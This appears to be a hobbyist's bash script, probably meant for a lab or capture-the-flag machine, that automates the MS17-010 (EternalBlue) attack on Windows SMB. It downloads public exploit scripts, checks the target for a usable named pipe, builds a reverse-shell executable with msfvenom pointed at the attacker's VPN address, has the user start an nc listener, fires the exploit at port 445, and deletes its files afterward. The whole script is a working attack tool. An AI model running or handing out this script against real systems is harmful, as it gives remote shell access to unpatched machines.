#/bin/bash

# Just for it to look cool
clear

# Grep vpn ip address
attackerIP=$(ip a | grep tun0 | grep inet | awk '{print $2}' | tr "/" " " | awk '{print $1}')

# Say something here
echo "Welcome to my first bash script that i write from scratch XD"
echo "Do follow the instructions here carefully"
read -p "Whats the IP address of the machine that you want to exploit: " victimIP
read -p "Which port you want this machine to listen for the shell?: " attackerPort

# Cloning scripts from Worawit and Helviojunior github
# Credits to the both of them
echo "Using Public exploit for this machine"
echo "Cloning from Worawit and Helviojunior"
wget -q https://raw.githubusercontent.com/worawit/MS17-010/master/checker.py
wget -q https://raw.githubusercontent.com/worawit/MS17-010/master/mysmb.py
wget -q https://raw.githubusercontent.com/helviojunior/MS17-010/master/send_and_execute.py

pipeName=""
hehe=1
while [ $hehe -eq 1 ]
do
        python2 checker.py $victimIP > result.txt
        choosePipe=$(cat result.txt | grep Ok | tr ":\n" " " | awk '{print $2}')
        if [ $choosePipe = "Ok" ]
        then
                pipeName=$(cat result.txt | grep Ok | tr ":\n" " " | awk '{print $1}')
                hehe=$(( $hehe + 1))
        else
                clear
                echo "Try adding some username to the checker.py and try again"
                read -p "Once you update the file, Press enter. the script will run again"
        fi
done

# Crafting payload
clear
echo "Needed files is here. Crafting payload for this exploit"

# Command to generate the payload
msfvenom -p windows/shell_reverse_tcp LHOST=$attackerIP LPORT=$attackerPort -f exe > reverse.exe

clear
echo "Payload generated! Last step!"
echo "Add the same username as you did with checker.py, to send_and_execute.py"
echo "And run nc -lvnp <Port> that you specify earlier"
read -p "Once you are ready, Press the enter key!"

# Run the exploit
python2 send_and_execute.py $victimIP reverse.exe 445 $pipeName

# Delete the other files
# If you want the files below, comment the command
rm *.py mysmb.pyc result.txt reverse.exe
